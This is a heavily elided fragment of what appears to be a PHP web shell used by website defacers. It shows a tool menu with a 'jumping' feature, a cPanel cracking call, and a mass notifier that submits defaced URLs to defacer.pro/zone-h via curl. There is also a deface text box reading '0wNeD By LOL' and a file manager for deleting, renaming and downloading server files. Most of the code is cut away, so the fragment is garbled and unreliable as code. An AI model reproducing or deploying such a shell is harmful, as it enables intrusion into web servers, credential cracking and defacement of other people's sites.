...
echo "<center><font size='6px' color='lavender'>LOL</font><br></center>
    <div class='pausi'>
...
echo "
        ...
        <a class='menu' href='?tools=zone-h'>Def-pro Notify</a>
...
if ($_GET['logout'] == 'true') {
    ...
    if ($_GET['tools'] == 'jumping') {
        ...
        if ($_POST['start']) {
            ...
            <textarea name='script' style='width: 450px; height: 200px;'>0wNeD By LOL</textarea><br>
        ...
        crack_cpanel();
    } elseif ($_GET['tools'] == 'def-pro ') {
        echo "<hr>";
        if ($_POST['submit']) {
            $domain = explode("\r\n", $_POST['url']);
            $nick   = $_POST['nick'];
            echo "<font color='white'>Defacer Onhold:</font> <a href='http://defacer.pro/notify=$nick/published=0' target='_blank'>http://www.zone-h.org/notify=$nick/published=0</a><br>";
            echo "<font color='white'>Defacer Archive:</font> <a href='http://defacer.pro/notify=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
            function zoneh($url, $nick)
            {
                $ch = curl_init("http://defacer.pro/notify");
            ...
            echo "<center>
        <font size='7' color='red' face='Orbitron'>def-pro Mass Notify</font><br>";
            echo "<br>
            <form method='post'>
            <input style='width: 350px;' type='text' name='nick' placeholder='Defacer' value=LOL><br><br>
            <textarea style='width: 350px;' placeholder='https://defacer.pro/' name='url'></textarea><br><br><input class='tombol' type='submit' name='submit' value='Submit'>
            </form>";
        }
    ...
    foreach ($si as $fol) {
        ...
        if ($fol == ".") {
            ...
            if (is_dir("$dir/$fol") == true) {
                ...
                <center>Delete</a> | <a href='?action=rename&rename=$dir/$fol&dir=$dir'>Rename</a>| <a href='?action=download&file=$dir/$file'>Download</a></center></td>
                <tr>";
            }
        }
    }
